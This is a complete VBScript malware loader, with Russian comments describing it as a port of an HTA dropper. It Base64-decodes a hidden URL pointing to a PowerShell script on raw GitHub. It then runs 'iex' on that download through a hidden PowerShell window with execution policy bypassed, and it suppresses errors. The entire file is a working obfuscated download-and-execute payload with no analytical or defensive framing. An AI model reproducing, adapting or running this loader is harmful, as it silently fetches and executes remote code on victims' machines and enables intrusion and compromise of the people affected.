' ============================================
' VBS Loader - PowerShell (аналог HTA)
' ============================================

' Функция Base64 (полный аналог JS-версии)
Function Base64Decode(ByVal base64)
    Dim a, o, i, c1, c2, c3, c4, b, x, y, z
    a = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/="
    o = ""
    i = 1
    
    ' Удаляем недопустимые символы
    Dim regex
    Set regex = New RegExp
    regex.Pattern = "[^A-Za-z0-9\+\/]"
    regex.Global = True
    base64 = regex.Replace(base64, "")
    
    ' Добавляем недостающие =
    Do While Len(base64) Mod 4 <> 0
        base64 = base64 & "="
    Loop
    
    ' Декодируем
    Do While i <= Len(base64)
        c1 = InStr(a, Mid(base64, i, 1)) - 1
        c2 = InStr(a, Mid(base64, i + 1, 1)) - 1
        c3 = InStr(a, Mid(base64, i + 2, 1)) - 1
        c4 = InStr(a, Mid(base64, i + 3, 1)) - 1
        
        b = (c1 * 4 + Int(c2 / 16)) And 255
        o = o & Chr(b)
        
        If c3 <> 64 Then
            b = ((c2 Mod 16) * 16 + Int(c3 / 4)) And 255
            o = o & Chr(b)
        End If
        
        If c4 <> 64 Then
            b = ((c3 Mod 4) * 64 + c4) And 255
            o = o & Chr(b)
        End If
        
        i = i + 4
    Loop
    
    Base64Decode = o
End Function

' Запуск PowerShell (скрыто)
On Error Resume Next
Dim shell, url, psCommand
Set shell = CreateObject("WScript.Shell")

' Закодированная ссылка (та же, что в HTA)
url = Base64Decode("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2NhcnJ5NzgwL2NsaWVzZXQvbWFpbi9zZWN1cmUucHMx")

' PowerShell команда (обфусцированная как в HTA)
psCommand = "iex (New-Object System.Net.WebClient).DownloadString('" & url & "')"

' Запуск PowerShell скрыто
shell.Run "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command """ & psCommand & """", 0, False

' Если ошибка - просто игнорируем
If Err.Number <> 0 Then
    Err.Clear
End If